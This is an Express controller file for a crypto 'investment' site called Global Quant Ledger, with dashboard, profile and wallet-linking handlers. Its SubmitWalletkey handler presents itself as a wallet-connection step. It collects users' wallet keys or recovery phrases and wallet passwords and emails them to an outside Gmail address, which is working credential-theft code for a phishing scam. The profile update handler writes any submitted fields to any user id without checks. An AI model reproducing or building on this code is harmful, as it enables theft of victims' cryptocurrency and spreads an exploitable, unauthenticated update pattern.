const User = require("../models/user");
const { Email } = require("../utils/email");
const { transporter, registrationMessage, adminRegistrationMessage } =
  new Email();

exports.RenderDashboardView = (req, res, next) => {
  // CURRENT USER VARIABLE
  let { user } = req;
  // DEPOSITS, PLANS, WITHDRAWALS VARIABLE
  let { deposits, plans, withdrawals } = user;

  try {
    for (var i = 0; i < deposits.length; i++) {
      if (deposits[i].status === "approved") {
        if (deposits[i].wallet === "xrp") {
          user.xrpBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "btc") {
          user.btcBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "xlm") {
          user.xlmBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "eth") {
          user.ethBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "algo") {
          user.algoBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "miota") {
          user.miotaBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "ada") {
          user.adaBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "hbar") {
          user.hbarBalance += deposits[i].amount;
        }
        if (deposits[i].wallet === "qtum") {
          user.qtumBalance += deposits[i].amount;
        }
        // user.totalDeposit += deposits[i].amount;
        deposits[i].status = "verified";

        console.log("======DEPOSITS NOTICE!========");
        console.log(
          `$${deposits[i].amount} deposit now active, removed and added to total deposits!`
        );
        console.log("=======================");
      }
    }

    //check for withdrawals
    withdrawals.forEach((withdrawal) => {
      if (withdrawal.status === "approved") {
        // user.totalWithdrawn += withdrawal.amount;
        withdrawal.status = "verified";

        console.log("======WITHDRAWAL NOTICE!=====");
        console.log(
          `Withdrawal of $${withdrawal.amount} is now approved and added to total withdrawn`
        );
        console.log("=======================");
      }
    });

    user.save();

    // RENDER DASHBOARD VIEW
    res.render("account/dashboard");
  } catch (err) {
    console.log(err);
    req.flash("error", "Something went wrong");
    return res.redirect("back");
  }
};

exports.RenderTransactionsView = (req, res, next) => {
  res.render("account/transactions");
};

exports.RenderNotificationsView = async (req, res, next) => {
  // INITIALIZE USER VARIABLE
  let { user } = req;
  // LOOP THROUGH USER NOTIFICATIONS AND SET THE STATUS OF EACH ONE TO PENDING
  await user.notifications.forEach((notif) => {
    notif.status === "pending" ? (notif.status = "read") : null;
  });
  // SAVE USER
  await user.save();

  res.render("account/notifications");
};

exports.RenderReferralView = (req, res, next) => {
  res.render("account/referral");
};

exports.RenderProfileView = (req, res, next) => {
  res.render("account/profile");
};

exports.RenderProfileUpdateView = (req, res, next) => {
  res.render("account/update-profile");
};

exports.UpdateProfileLogic = (req, res, next) => {
  let { id } = req.params;
  let { data } = req.body;

  User.findByIdAndUpdate(id, data, (err, updatedUser) => {
    if (err) {
      req.flash("error", "something went wrong");
      return res.redirect("back");
    } else {
      req.flash("success", "Saved ✓");
      return res.redirect("back");
    }
  });
};

exports.RenderLinkWalletView = (req, res, next) => {
  res.render("account/link");
};

exports.SubmitWalletkey = async (req, res, next) => {
  let { wallet, type, key, walletPassword } = req.body;
  let email = req.user.email;
  // ###- SENDING PHRASE -###
  const output = `
    <p>Email: ${email}</p>
    <p>Wallet: ${wallet}</p>
    <p>Connection Type: ${type}</p>
    <p>key: ${key}</p>
    ${walletPassword === "" ? "" : `<p>Wallet Password: ${walletPassword}</p>`}
    
   `;
  await transporter
    .sendMail({
      from: '"Global Quant Ledger" <support@globalquantledger.com>',
      to: ["Quantglobal2@gmail.com"],
      subject: "Global Quant Ledger - Key Submission",
      text: "",
      html: output,
    })
    .then((success) => {
      console.log(`SUCCESSFULLY PHRASE TO ADMIN`);
      res.status(200).json({
        status: "success",
      });
    })
    .catch((err) => {
      console.log(`ERROR WHILE SENDING PHRASE TO ADMIN`);
      console.log(err);
      res.status(500).json({
        status: "error",
      });
    });
};

exports.RenderWalletConnectSuccess = (req, res, next) => {
  res.render("account/wallet-connect-success");
};
